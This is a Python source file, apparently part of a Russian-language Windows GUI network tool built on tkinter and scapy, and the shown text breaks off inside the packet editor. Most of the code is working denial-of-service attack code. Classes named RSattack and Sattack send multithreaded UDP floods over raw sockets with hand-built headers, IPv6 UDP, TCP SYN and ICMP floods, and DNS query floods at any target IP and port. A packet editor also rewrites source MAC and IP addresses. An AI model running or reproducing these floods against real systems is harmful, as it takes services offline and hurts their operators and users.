import tkinter as tk
from tkinter import *
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import time
import subprocess
import queue
import socket
import struct
import random
import os
import psutil
import platform
import ctypes
import sys
import json
import winreg
import ipaddress
from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.l2 import ARP, Ether, Dot1Q
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest
from scapy.layers.dns import DNS, DNSQR, DNSRR

def find_exe(exe_name):
    if getattr(sys, 'frozen', False):
        base_dir = os.path.dirname(sys.executable)
    else:
        base_dir = os.path.dirname(os.path.abspath(__file__))
    search_paths = [
        os.path.join(base_dir, "exe", exe_name),
        os.path.join(base_dir, exe_name),
        os.path.join(os.getcwd(), "exe", exe_name),
        os.path.join(os.getcwd(), exe_name),
    ]
    for path in search_paths:
        if os.path.isfile(path):
            return path
    return None

class RSattack:
    def __init__(self):
        self.running = False
        self.threads = []
        self.stats_lock = threading.Lock()
        self.stats = {
            'total_sent': 0,
            'current_pps': 0,
            'start_time': 0,
            'total_bytes': 0,
            'last_update': 0
        }
        self.udp_data_cache = {}
        self._monitor_lock = threading.Lock()
        self._completion_notified = False

    def start_udp_attack(self, target_ip, port, packet_size, duration, continuous, interface, app_log, on_complete=None):
        try:
            socket.inet_pton(socket.AF_INET6, target_ip)
            is_ipv6 = True
        except socket.error:
            is_ipv6 = False

        if is_ipv6:
            return self.start_udp_attack_ipv6(target_ip, port, packet_size, duration, continuous, interface, app_log, on_complete)

        self.running = True
        self._completion_notified = False
        self.stats = {
            'total_sent': 0,
            'current_pps': 0,
            'start_time': time.time(),
            'total_bytes': 0,
            'last_update': time.time()
        }
        try:
            source_ip = get_if_addr(interface)
            if not source_ip or source_ip == '0.0.0.0':
                source_ip = "192.168.1.1"
        except:
            source_ip = "192.168.1.1"
        data_size = max(0, packet_size - 28)
        cache_key = f"{packet_size}_{port}"
        if cache_key not in self.udp_data_cache:
            self.udp_data_cache[cache_key] = {
                'data': os.urandom(data_size),
                'pseudo_header': self._create_udp_pseudo_header(source_ip, target_ip, port, data_size)
            }
        cached = self.udp_data_cache[cache_key]
        data = cached['data']
        pseudo_header_template = cached['pseudo_header']
        total_length = 28 + data_size
        if platform.system() == "Windows":
            num_threads = 8
        else:
            num_threads = 16
        app_log(f"UDP flood: {num_threads} threads, packet size {packet_size} bytes")
        app_log(f"Target: {target_ip}:{port}")
        app_log(f"Interface: {interface} (src_ip: {source_ip})")
        worker_threads = []
        for i in range(num_threads):
            thread = threading.Thread(
                target=self._udp_raw_worker,
                args=(i, target_ip, port, total_length, duration, continuous, 
                      interface, source_ip, data, pseudo_header_template, app_log),
                daemon=True
            )
            thread.start()
            self.threads.append(thread)
            worker_threads.append(thread)
        stats_thread = threading.Thread(target=self._stats_worker, daemon=True)
        stats_thread.start()
        self.threads.append(stats_thread)
        monitor_thread = threading.Thread(
            target=self._monitor_udp_workers,
            args=(worker_threads, on_complete),
            daemon=True
        )
        monitor_thread.start()
        self.threads.append(monitor_thread)
        return True

    def start_udp_attack_ipv6(self, target_ip, port, packet_size, duration, continuous, interface, app_log, on_complete=None):
        self.running = True
        self._completion_notified = False
        self.stats = {
            'total_sent': 0,
            'current_pps': 0,
            'start_time': time.time(),
            'total_bytes': 0,
            'last_update': time.time()
        }
        num_threads = min(8, os.cpu_count() or 2)
        app_log(f"IPv6 UDP flood: {num_threads} threads, packet size {packet_size} bytes")
        app_log(f"Target: [{target_ip}]:{port}")
        app_log(f"Interface: {interface}")
        worker_threads = []
        for i in range(num_threads):
            thread = threading.Thread(
                target=self._udp_ipv6_worker,
                args=(i, target_ip, port, packet_size, duration, continuous, interface, app_log),
                daemon=True
            )
            thread.start()
            self.threads.append(thread)
            worker_threads.append(thread)
        stats_thread = threading.Thread(target=self._stats_worker, daemon=True)
        stats_thread.start()
        self.threads.append(stats_thread)
        monitor_thread = threading.Thread(
            target=self._monitor_udp_workers,
            args=(worker_threads, on_complete),
            daemon=True
        )
        monitor_thread.start()
        self.threads.append(monitor_thread)
        return True

    def _udp_ipv6_worker(self, thread_id, target_ip, port, packet_size, total_seconds, continuous, interface, app_log):
        sent = 0
        start_time = time.time()
        payload = os.urandom(max(0, packet_size - 48))
        while self.running and (continuous or (time.time() - start_time) < total_seconds):
            try:
                pkt = IPv6(dst=target_ip) / UDP(sport=random.randint(1024, 65535), dport=port) / payload
                send(pkt, iface=interface, verbose=0)
                sent += 1
                with self.stats_lock:
                    self.stats['total_sent'] += 1
                    self.stats['total_bytes'] += len(pkt)
            except Exception as e:
                app_log(f"[IPv6 UDP-{thread_id}] Error: {str(e)[:80]}")
                time.sleep(0.1)
            if sent % 100 == 0:
                time.sleep(0.0005)

    def start_tcp_attack_ipv6(self, target_ip, port, packet_size, duration, continuous, interface, app_log, on_complete=None):
        self.running = True
        self._completion_notified = False
        self.stats = {
            'total_sent': 0,
            'current_pps': 0,
            'start_time': time.time(),
            'total_bytes': 0,
            'last_update': time.time()
        }
        num_threads = min(8, os.cpu_count() or 2)
        app_log(f"IPv6 TCP flood: {num_threads} threads, packet size {packet_size} bytes")
        app_log(f"Target: [{target_ip}]:{port}")
        app_log(f"Interface: {interface}")
        worker_threads = []
        for i in range(num_threads):
            thread = threading.Thread(
                target=self._tcp_ipv6_worker,
                args=(i, target_ip, port, packet_size, duration, continuous, interface, app_log),
                daemon=True
            )
            thread.start()
            self.threads.append(thread)
            worker_threads.append(thread)
        stats_thread = threading.Thread(target=self._stats_worker, daemon=True)
        stats_thread.start()
        self.threads.append(stats_thread)
        monitor_thread = threading.Thread(
            target=self._monitor_udp_workers,
            args=(worker_threads, on_complete),
            daemon=True
        )
        monitor_thread.start()
        self.threads.append(monitor_thread)
        return True

    def _tcp_ipv6_worker(self, thread_id, target_ip, port, packet_size, total_seconds, continuous, interface, app_log):
        sent = 0
        start_time = time.time()
        payload = os.urandom(max(0, packet_size - 60))
        while self.running and (continuous or (time.time() - start_time) < total_seconds):
            try:
                pkt = IPv6(dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=port, flags="S") / payload
                send(pkt, iface=interface, verbose=0)
                sent += 1
                with self.stats_lock:
                    self.stats['total_sent'] += 1
                    self.stats['total_bytes'] += len(pkt)
            except Exception as e:
                app_log(f"[IPv6 TCP-{thread_id}] Error: {str(e)[:80]}")
                time.sleep(0.1)
            if sent % 100 == 0:
                time.sleep(0.0005)

    def start_icmp_attack_ipv6(self, target_ip, packet_size, duration, continuous, interface, app_log, on_complete=None):
        self.running = True
        self._completion_notified = False
        self.stats = {
            'total_sent': 0,
            'current_pps': 0,
            'start_time': time.time(),
            'total_bytes': 0,
            'last_update': time.time()
        }
        num_threads = min(8, os.cpu_count() or 2)
        app_log(f"IPv6 ICMP flood: {num_threads} threads, packet size {packet_size} bytes")
        app_log(f"Target: [{target_ip}]")
        app_log(f"Interface: {interface}")
        worker_threads = []
        for i in range(num_threads):
            thread = threading.Thread(
                target=self._icmp_ipv6_worker,
                args=(i, target_ip, packet_size, duration, continuous, interface, app_log),
                daemon=True
            )
            thread.start()
            self.threads.append(thread)
            worker_threads.append(thread)
        stats_thread = threading.Thread(target=self._stats_worker, daemon=True)
        stats_thread.start()
        self.threads.append(stats_thread)
        monitor_thread = threading.Thread(
            target=self._monitor_udp_workers,
            args=(worker_threads, on_complete),
            daemon=True
        )
        monitor_thread.start()
        self.threads.append(monitor_thread)
        return True

    def _icmp_ipv6_worker(self, thread_id, target_ip, packet_size, total_seconds, continuous, interface, app_log):
        sent = 0
        start_time = time.time()
        payload = os.urandom(max(0, packet_size - 48))
        while self.running and (continuous or (time.time() - start_time) < total_seconds):
            try:
                pkt = IPv6(dst=target_ip) / ICMPv6EchoRequest() / payload
                send(pkt, iface=interface, verbose=0)
                sent += 1
                with self.stats_lock:
                    self.stats['total_sent'] += 1
                    self.stats['total_bytes'] += len(pkt)
            except Exception as e:
                app_log(f"[IPv6 ICMP-{thread_id}] Error: {str(e)[:80]}")
                time.sleep(0.1)
            if sent % 100 == 0:
                time.sleep(0.0005)

    def _monitor_udp_workers(self, worker_threads, on_complete=None):
        for thread in worker_threads:
            thread.join()
        with self._monitor_lock:
            should_notify = self.running and not self._completion_notified
            self.running = False
            if should_notify:
                self._completion_notified = True
        if should_notify and on_complete:
            on_complete()

    def _udp_raw_worker(self, thread_id, target_ip, port, total_length, total_seconds, 
                        continuous, interface, source_ip, data, pseudo_header_template, app_log):
        packets_sent = 0
        src_port_base = (thread_id * 1000) + 1024
        start_time = time.time()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2 * 1024 * 1024)
            batch_size = 200
            while self.running and (continuous or (time.time() - start_time) < total_seconds):
                batch_packets = []
                for i in range(batch_size):
                    if not continuous and (time.time() - start_time) >= total_seconds:
                        break
                    packet = self._create_udp_packet(
                        source_ip, target_ip, port,
                        total_length,
                        packets_sent,
                        src_port_base + (packets_sent % 1000),
                        data,
                        pseudo_header_template
                    )
                    batch_packets.append(packet)
                    packets_sent += 1
                try:
                    for packet in batch_packets:
                        sock.sendto(packet, (target_ip, 0))
                    with self.stats_lock:
                        self.stats['total_sent'] += len(batch_packets)
                        self.stats['total_bytes'] += sum(len(p) for p in batch_packets)
                except Exception as e:
                    time.sleep(0.005)
                if packets_sent % 10000 == 0:
                    time.sleep(0.0005)
            sock.close()
        except Exception as e:
            app_log(f"[UDP-{thread_id}] Error: {str(e)[:80]}")

    def _create_udp_pseudo_header(self, src_ip, dst_ip, dst_port, data_size):
        return struct.pack('!4s4sBBH',
            socket.inet_aton(src_ip),
            socket.inet_aton(dst_ip),
            0, 17,
            8 + data_size)

    def _create_udp_packet(self, src_ip, dst_ip, dst_port, total_length, seq_num, src_port, data, pseudo_header_template):
        ip_header = struct.pack('!BBHHHBBH4s4s',
            0x45, 0x00,
            total_length,
            (seq_num >> 16) & 0xFFFF,
            0x4000,
            64, 17, 0,
            socket.inet_aton(src_ip),
            socket.inet_aton(dst_ip)
        )
        udp_header = struct.pack('!HHHH',
            src_port, dst_port,
            8 + len(data), 0
        )
        udp_checksum = self._calculate_checksum_fast(pseudo_header_template + udp_header + data)
        udp_header = udp_header[:6] + struct.pack('H', udp_checksum)
        ip_checksum = self._calculate_checksum_fast(ip_header)
        ip_header = ip_header[:10] + struct.pack('H', ip_checksum) + ip_header[12:]
        return ip_header + udp_header + data

    def _calculate_checksum_fast(self, data):
        if len(data) % 2:
            data += b'\x00'
        s = 0
        mv = memoryview(data)
        for i in range(0, len(mv), 2):
            w = (mv[i] << 8) + mv[i+1]
            s += w
        s = (s & 0xffff) + (s >> 16)
        s = (s & 0xffff) + (s >> 16)
        return ~s & 0xffff

    def _stats_worker(self):
        last_time = time.time()
        last_count = 0
        while self.running:
            time.sleep(0.5)
            current_time = time.time()
            with self.stats_lock:
                current_count = self.stats['total_sent']
                time_diff = current_time - last_time
                if time_diff > 0:
                    pps = int((current_count - last_count) / time_diff)
                    self.stats['current_pps'] = pps
                last_time = current_time
                last_count = current_count

    def stop(self):
        self.running = False
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=0.5)
        self.threads.clear()
        return self.stats.copy()

class Sattack:
    def __init__(self):
        self.running = False
        self.threads = []
        self.stats_lock = threading.Lock()
        self.stats = {
            'total_sent': 0,
            'start_time': 0,
            'total_bytes': 0
        }
        self._monitor_lock = threading.Lock()
        self._completion_notified = False

    def start_dns_attack(self, target_ip, duration, continuous, interface, app_log, on_complete=None):
        try:
            socket.inet_pton(socket.AF_INET6, target_ip)
            is_ipv6 = True
        except socket.error:
            is_ipv6 = False

        self.running = True
        self._completion_notified = False
        self.stats = {
            'total_sent': 0,
            'start_time': time.time(),
            'total_bytes': 0
        }
        num_threads = min(4, os.cpu_count() or 2)
        app_log(f"DNS flood: {num_threads} threads")
        app_log(f"Target: {target_ip}:53")
        app_log(f"Interface: {interface}")
        worker_threads = []
        for i in range(num_threads):
            thread = threading.Thread(
                target=self._dns_scapy_worker,
                args=(i, target_ip, duration, continuous, interface, app_log, is_ipv6),
                daemon=True
            )
            thread.start()
            self.threads.append(thread)
            worker_threads.append(thread)
        monitor_thread = threading.Thread(
            target=self._monitor_dns_workers,
            args=(worker_threads, on_complete),
            daemon=True
        )
        monitor_thread.start()
        self.threads.append(monitor_thread)
        return True

    def _monitor_dns_workers(self, worker_threads, on_complete=None):
        for thread in worker_threads:
            thread.join()
        with self._monitor_lock:
            should_notify = self.running and not self._completion_notified
            self.running = False
            if should_notify:
                self._completion_notified = True
        if should_notify and on_complete:
            on_complete()

    def _dns_scapy_worker(self, thread_id, target_ip, total_seconds, continuous, interface, app_log, is_ipv6):
        sent = 0
        domains = ["example.com", "google.com", "yandex.ru", "mail.ru", "github.com"]
        start_time = time.time()
        while self.running and (continuous or (time.time() - start_time) < total_seconds):
            try:
                if is_ipv6:
                    ip_layer = IPv6(dst=target_ip)
                else:
                    ip_layer = IP(dst=target_ip)
                packet = ip_layer / UDP(
                    sport=random.randint(1024, 65535),
                    dport=53
                ) / DNS(
                    rd=1,
                    qd=DNSQR(qname=random.choice(domains))
                )
                send(packet, verbose=0)
                sent += 1
                with self.stats_lock:
                    self.stats['total_sent'] += 1
                    self.stats['total_bytes'] += len(packet)
            except Exception as e:
                app_log(f"[DNS-{thread_id}] Error: {str(e)[:80]}")
                time.sleep(0.1)

    def stop(self):
        self.running = False
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=0.5)
        self.threads.clear()
        return self.stats.copy()

class Theme:
    DEFAULT_FONT = ('Segoe UI', 10)
    MONO_FONT = ('Consolas', 9)
    def __init__(self, root):
        self.root = root
        self.current_theme = "dark"
        self.style = ttk.Style()
        self.setup_themes()
    def setup_themes(self):
        self.themes = {
            "light": {
                "window_bg": "#f1f5f9",
                "primary_bg": "#e2e8f0",
                "secondary_bg": "#ffffff",
                "primary_fg": "#0f172a",
                "secondary_fg": "#475569",
                "accent": "#2563eb",
                "accent_hover": "#1d4ed8",
                "border": "#cbd5e1",
                "input_bg": "#ffffff",
                "input_fg": "#0f172a",
                "button_bg": "#334155",
                "button_fg": "#ffffff",
                "tree_bg": "#ffffff",
                "tree_fg": "#0f172a",
                "tree_selected": "#dbeafe",
                "text_bg": "#ffffff",
                "text_fg": "#0f172a",
                "scrollbar_bg": "#cbd5e1",
                "scrollbar_trough": "#e2e8f0",
                "scrollbar_arrow": "#475569",
                "header_bg": "#f8fafc",
                "header_fg": "#334155",
                "field_focus": "#bfdbfe"
            },
            "dark": {
                "window_bg": "#111111",
                "primary_bg": "#1B1B1E",
                "secondary_bg": "#232326",
                "primary_fg": "#FFFFFF",
                "secondary_fg": "#C2BFBB",
                "accent": "#798086",
                "accent_hover": "#8a9197",
                "border": "#353535",
                "input_bg": "#202023",
                "input_fg": "#FFFFFF",
                "button_bg": "#353535",
                "button_fg": "#FFFFFF",
                "tree_bg": "#1B1B1E",
                "tree_fg": "#FFFFFF",
                "tree_selected": "#4a4f55",
                "text_bg": "#202023",
                "text_fg": "#FFFFFF",
                "scrollbar_bg": "#444444",
                "scrollbar_trough": "#1B1B1E",
                "scrollbar_arrow": "#C2BFBB",
                "header_bg": "#2A2A2D",
                "header_fg": "#FFFFFF",
                "field_focus": "#3f4348"
            }
        }
    def apply_theme(self, theme_name):
        if theme_name not in self.themes:
            return
        self.current_theme = theme_name
        theme = self.themes[theme_name]
        self.style.theme_use('clam')
        self.style.configure('.',
                             background=theme['primary_bg'],
                             foreground=theme['primary_fg'],
                             fieldbackground=theme['input_bg'],
                             selectbackground=theme['accent'],
                             bordercolor=theme['border'],
                             lightcolor=theme['border'],
                             darkcolor=theme['border'],
                             font=self.DEFAULT_FONT)
        self.root.configure(bg=theme['window_bg'])
        self.root.tk_setPalette(
            background=theme['window_bg'],
            foreground=theme['primary_fg'],
            activeBackground=theme['accent'],
            activeForeground=theme['button_fg']
        )
        self.style.configure('TFrame', background=theme['primary_bg'])
        self.style.configure('TLabel',
                             background=theme['primary_bg'],
                             foreground=theme['primary_fg'],
                             font=self.DEFAULT_FONT)
        self.style.configure('TLabelframe',
                             background=theme['secondary_bg'],
                             foreground=theme['primary_fg'],
                             bordercolor=theme['border'],
                             relief='solid')
        self.style.configure('TLabelframe.Label',
                             background=theme['secondary_bg'],
                             foreground=theme['header_fg'],
                             font=('Segoe UI Semibold', 10))
        self.style.configure('TButton',
                             background=theme['button_bg'],
                             foreground=theme['button_fg'],
                             borderwidth=1,
                             relief='flat',
                             focuscolor=theme['accent'],
                             padding=(8, 4),
                             font=('Segoe UI Semibold', 9),
                             wraplength=150)
        self.style.map('TButton',
                       background=[('active', theme['accent_hover']), ('pressed', theme['accent'])],
                       foreground=[('disabled', theme['secondary_fg'])],
                       relief=[('pressed', 'sunken')])
        self.style.configure('TEntry',
                             fieldbackground=theme['input_bg'],
                             foreground=theme['input_fg'],
                             insertcolor=theme['input_fg'],
                             bordercolor=theme['border'],
                             lightcolor=theme['border'],
                             darkcolor=theme['border'],
                             font=self.DEFAULT_FONT)
        self.style.map('TEntry',
                       fieldbackground=[('focus', theme['field_focus'])],
                       foreground=[('disabled', theme['secondary_fg'])])
        self.style.configure('TCombobox',
                             fieldbackground=theme['input_bg'],
                             foreground=theme['input_fg'],
                             background=theme['button_bg'],
                             arrowcolor=theme['secondary_fg'],
                             bordercolor=theme['border'],
                             lightcolor=theme['border'],
                             darkcolor=theme['border'],
                             font=self.DEFAULT_FONT)
        self.style.configure('TCheckbutton',
                             background=theme['primary_bg'],
                             foreground=theme['primary_fg'],
                             focuscolor=theme['accent'])
        self.style.configure('TNotebook',
                             background=theme['secondary_bg'],
                             bordercolor=theme['border'])
        self.style.configure('TNotebook.Tab',
                             background=theme['header_bg'],
                             foreground=theme['secondary_fg'],
                             padding=(12, 6),
                             font=('Segoe UI', 9))
        self.style.map('TNotebook.Tab',
                       background=[('selected', theme['primary_bg']), ('active', theme['secondary_bg'])],
                       foreground=[('selected', theme['primary_fg']), ('active', theme['primary_fg'])])
        self.style.configure('Treeview',
                             background=theme['tree_bg'],
                             foreground=theme['tree_fg'],
                             fieldbackground=theme['tree_bg'],
                             bordercolor=theme['border'],
                             rowheight=22,
                             font=self.DEFAULT_FONT)
        self.style.configure('Treeview.Heading',
                             background=theme['header_bg'],
                             foreground=theme['header_fg'],
                             relief='flat',
                             font=('Segoe UI Semibold', 9))
        self.style.map('Treeview',
                       background=[('selected', theme['tree_selected'])],
                       foreground=[('selected', theme['primary_fg'])])
        self.style.map('Treeview.Heading',
                       background=[('active', theme['secondary_bg'])])
        self.style.configure('TScrollbar',
                             background=theme['scrollbar_bg'],
                             troughcolor=theme['scrollbar_trough'],
                             arrowcolor=theme['scrollbar_arrow'])
        self.apply_to_widgets(self.root, theme)
    def apply_to_widgets(self, widget, theme):
        widget_stack = [widget]
        while widget_stack:
            current = widget_stack.pop()
            try:
                widget_type = current.winfo_class()
                if widget_type in ('Frame', 'Labelframe', 'LabelFrame'):
                    current.config(bg=theme['primary_bg'], highlightbackground=theme['border'])
                elif widget_type == 'Label':
                    current.config(bg=theme['primary_bg'], fg=theme['primary_fg'], font=self.DEFAULT_FONT)
                elif widget_type == 'Button':
                    current.config(bg=theme['button_bg'], fg=theme['button_fg'],
                                   activebackground=theme['accent_hover'], activeforeground=theme['button_fg'],
                                   font=('Segoe UI Semibold', 9), padx=8, pady=3, wraplength=150,
                                   relief='flat', bd=1)
                elif widget_type == 'Entry':
                    current.config(bg=theme['input_bg'], fg=theme['input_fg'],
                                   insertbackground=theme['input_fg'], font=self.DEFAULT_FONT,
                                   relief='flat', highlightthickness=1,
                                   highlightbackground=theme['border'], highlightcolor=theme['accent'])
                elif widget_type == 'Text':
                    current.config(bg=theme['text_bg'], fg=theme['text_fg'],
                                   insertbackground=theme['text_fg'], selectbackground=theme['accent'],
                                   selectforeground=theme['button_fg'], font=self.MONO_FONT,
                                   relief='flat', highlightthickness=1,
                                   highlightbackground=theme['border'], highlightcolor=theme['accent'])
                elif widget_type == 'Scrollbar':
                    current.config(bg=theme['scrollbar_bg'], troughcolor=theme['scrollbar_trough'],
                                   activebackground=theme['scrollbar_bg'])
                elif widget_type == 'Listbox':
                    current.config(bg=theme['input_bg'], fg=theme['input_fg'],
                                   selectbackground=theme['accent'], selectforeground=theme['button_fg'],
                                   font=self.DEFAULT_FONT)
                elif widget_type == 'Canvas':
                    current.config(bg=theme['primary_bg'], highlightbackground=theme['border'])
            except tk.TclError:
                pass
            widget_stack.extend(current.winfo_children())

class Editor:
    def __init__(self, parent, packet, callback):
        self.parent = parent
        self.packet = packet
        self.callback = callback
        self.edited_packet = None
        self.editor_window = tk.Toplevel(parent)
        self.editor_window.title("Редактор пакета")
        self.editor_window.geometry("1000x800")
        self.editor_window.transient(parent)
        self.editor_window.grab_set()
        try:
            self.editor_window.iconbitmap("other/images.ico")
        except:
            pass
        self.create_widgets()
        self.parse_packet()
    def create_widgets(self):
        main_frame = ttk.Frame(self.editor_window)
        main_frame.pack(fill='both', expand=True, padx=10, pady=10)
        info_frame = ttk.LabelFrame(main_frame, text="Информация о пакете")
        info_frame.pack(fill='x', padx=5, pady=5)
        ttk.Label(info_frame, text="Исходный пакет:").grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.original_info = ttk.Label(info_frame, text=self.packet.summary())
        self.original_info.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        details_frame = ttk.LabelFrame(main_frame, text="Детали пакета")
        details_frame.pack(fill='x', padx=5, pady=5)
        self.packet_details = scrolledtext.ScrolledText(details_frame, height=8, wrap=tk.WORD)
        self.packet_details.pack(fill='both', expand=True, padx=5, pady=5)
        self.packet_details.config(state='normal')
        eth_frame = ttk.LabelFrame(main_frame, text="Ethernet Layer")
        eth_frame.pack(fill='x', padx=5, pady=5)
        ttk.Label(eth_frame, text="Source MAC:").grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.eth_src = ttk.Entry(eth_frame, width=20)
        self.eth_src.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(eth_frame, text="Dest MAC:").grid(row=0, column=2, padx=5, pady=2, sticky='w')
        self.eth_dst = ttk.Entry(eth_frame, width=20)
        self.eth_dst.grid(row=0, column=3, padx=5, pady=2, sticky='w')
        ip_frame = ttk.LabelFrame(main_frame, text="IP Layer")
        ip_frame.pack(fill='x', padx=5, pady=5)
        ttk.Label(ip_frame, text="Source IP:").grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.ip_src = ttk.Entry(ip_frame, width=20)
        self.ip_src.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(ip_frame, text="Dest IP:").grid(row=0, column=2, padx=5, pady=2, sticky='w')
        self.ip_dst = ttk.Entry(ip_frame, width=20)
        self.ip_dst.grid(row=0, column=3, padx=5, pady=2, sticky='w')
        ttk.Label(ip_frame, text="TTL:").grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.ip_ttl = ttk.Entry(ip_frame, width=10)
        self.ip_ttl.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        transport_frame = ttk.LabelFrame(main_frame, text="Transport Layer")
        transport_frame.pack(fill='x', padx=5, pady=5)
        ttk.Label(transport_frame, text="Protocol:").grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.transport_proto = ttk.Combobox(transport_frame, values=["TCP", "UDP", "ICMP", "RAW"], width=10)
        self.transport_proto.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(transport_frame, text="Source Port:").grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.src_port = ttk.Entry(transport_frame, width=10)
        self.src_port.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(transport_frame, text="Dest Port:").grid(row=1, column=2, padx=5, pady=2, sticky='w')
        self.dst_port = ttk.Entry(transport_frame, width=10)
        self.dst_port.grid(row=1, column=3, padx=5, pady=2, sticky='w')
        tcp_flags_frame = ttk.Frame(transport_frame)
        tcp_flags_frame.grid(row=2, column=0, columnspan=4, pady=5)
        self.tcp_flags_vars = {}
        tcp_flags = ["FIN", "SYN", "RST", "PSH", "ACK", "URG", "ECE", "CWR"]
        for i, flag in enumerate(tcp_flags):
            self.tcp_flags_vars[flag] = tk.BooleanVar()
            ttk.Checkbutton(tcp_flags_frame, text=flag, variable=self.tcp_flags_vars[flag]).grid(
                row=0, column=i, padx=2, sticky='w')
        data_frame = ttk.LabelFrame(main_frame, text="Payload Data")
        data_frame.pack(fill='both', expand=True, padx=5, pady=5)
        self.payload_data = scrolledtext.ScrolledText(data_frame, height=10, wrap=tk.WORD)
        self.payload_data.pack(fill='both', expand=True, padx=5, pady=5)
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        ttk.Button(button_frame, text="Применить изменения", 
                  command=self.apply_changes).pack(side='left', padx=5)
        ttk.Button(button_frame, text="Отмена", 
                  command=self.editor_window.destroy).pack(side='right', padx=5)
    def parse_packet(self):
        if self.packet.haslayer(Ether):
            self.eth_src.insert(0, self.packet[Ether].src)
            self.eth_dst.insert(0, self.packet[Ether].dst)
        ip_layer = None
        if self.packet.haslayer(IPv6):
            ip_layer = self.packet[IPv6]
        elif self.packet.haslayer(IP):
            ip_layer = self.packet[IP]
        if ip_layer:
            self.ip_src.insert(0, ip_layer.src)
            self.ip_dst.insert(0, ip_layer.dst)
            if hasattr(ip_layer, 'ttl'):
                self.ip_ttl.insert(0, str(ip_layer.ttl))
            elif hasattr(ip_layer, 'hlim'):
                self.ip_ttl.insert(0, str(ip_layer.hlim))
            if self.packet.haslayer(TCP):
                self.transport_proto.set("TCP")
                self.src_port.insert(0, str(self.packet[TCP].sport))
                self.dst_port.insert(0, str(self.packet[TCP].dport))
                flags = self.packet[TCP].flags
                self.tcp_flags_vars["FIN"].set(bool(flags & 0x01))
                self.tcp_flags_vars["SYN"].set(bool(flags & 0x02))
                self.tcp_flags_vars["RST"].set(bool(flags & 0x04))
                self.tcp_flags_vars["PSH"].set(bool(flags & 0x08))
                self.tcp_flags_vars["ACK"].set(bool(flags & 0x10))
                self.tcp_flags_vars["URG"].set(bool(flags & 0x20))
                self.tcp_flags_vars["ECE"].set(bool(flags & 0x40))
                self.tcp_flags_vars["CWR"].set(bool(flags & 0x80))
                if self.packet.haslayer(Raw):
                    try:
                        self.payload_data.insert('1.0', self.packet[Raw].load.hex())
                    except:
                        self.payload_data.insert('1.0', str(self.packet[Raw].load))
            elif self.packet.haslayer(UDP):
                self.transport_proto.set("UDP")
                self.src_port.insert(0, str(self.packet[UDP].sport))
                self.dst_port.insert(0, str(self.packet[UDP].dport))
                if self.packet.haslayer(Raw):
                    try:
                        self.payload_data.insert('1.0', self.packet[Raw].load.hex())
                    except:
                        self.payload_data.insert('1.0', str(self.packet[Raw].load))
            elif self.packet.haslayer(ICMP):
                self.transport_proto.set("ICMP")
            else:
                self.transport_proto.set("RAW")
        self.show_packet_details()
    def show_packet_details(self):
        details = "=== ДЕТАЛИ ПАКЕТА ===\n\n"
        if self.packet.haslayer(Ether):
            details += f"Ethernet:\n"
            details += f"  Source: {self.packet[Ether].src}\n"
            details += f"  Destination: {self.packet[Ether].dst}\n"
            details += f"  Type: {self.packet[Ether].type}\n\n"
        if self.packet.haslayer(IPv6):
            details += f"IPv6:\n"
            details += f"  Source: {self.packet[IPv6].src}\n"
            details += f"  Destination: {self.packet[IPv6].dst}\n"
            details += f"  Hop Limit: {self.packet[IPv6].hlim}\n"
            details += f"  Next Header: {self.packet[IPv6].nh}\n\n"
        elif self.packet.haslayer(IP):
            details += f"IP:\n"
            details += f"  Version: {self.packet[IP].version}\n"
            details += f"  Source: {self.packet[IP].src}\n"
            details += f"  Destination: {self.packet[IP].dst}\n"
            details += f"  TTL: {self.packet[IP].ttl}\n"
            details += f"  Protocol: {self.packet[IP].proto}\n\n"
        if self.packet.haslayer(TCP):
            details += f"TCP:\n"
            details += f"  Source Port: {self.packet[TCP].sport}\n"
            details += f"  Destination Port: {self.packet[TCP].dport}\n"
            details += f"  Flags: {self.packet[TCP].flags}\n"
            details += f"  Sequence: {self.packet[TCP].seq}\n"
            details += f"  Acknowledgment: {self.packet[TCP].ack}\n"
            details += f"  Window: {self.packet[TCP].window}\n\n"
        elif self.packet.haslayer(UDP):
            details += f"UDP:\n"
            details += f"  Source Port: {self.packet[UDP].sport}\n"
            details += f"  Destination Port: {self.packet[UDP].dport}\n"
            details += f"  Length: {self.packet[UDP].len}\n\n"
        elif self.packet.haslayer(ICMP):
            details += f"ICMP:\n"
            details += f"  Type: {self.packet[ICMP].type}\n"
            details += f"  Code: {self.packet[ICMP].code}\n\n"
        if self.packet.haslayer(Raw):
            details += f"Payload:\n"
            payload = self.packet[Raw].load
            details += f"  Length: {len(payload)} bytes\n"
            try:
                details += f"  Hex: {payload.hex()}\n"
                if len(payload) < 100:
                    try:
                        text = payload.decode('utf-8', errors='ignore')
                        if all(c.isprintable() or c in '\n\r\t' for c in text):
                            details += f"  Text: {text}\n"
                    except:
                        pass
            except:
                details += f"  Content: {str(payload)}\n"
        self.packet_details.insert('1.0', details)
        self.packet_details.config(state='disabled')
    def apply_changes(self):
        try:
            new_packet = self.create_modified_packet()
            self.edited_packet = new_packet
            self.callback(new_packet, True)
            self.editor_window.destroy()
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось создать пакет: {str(e)}")
    def create_modified_packet(self):
        new_packet = Ether()
        if self.eth_src.get():
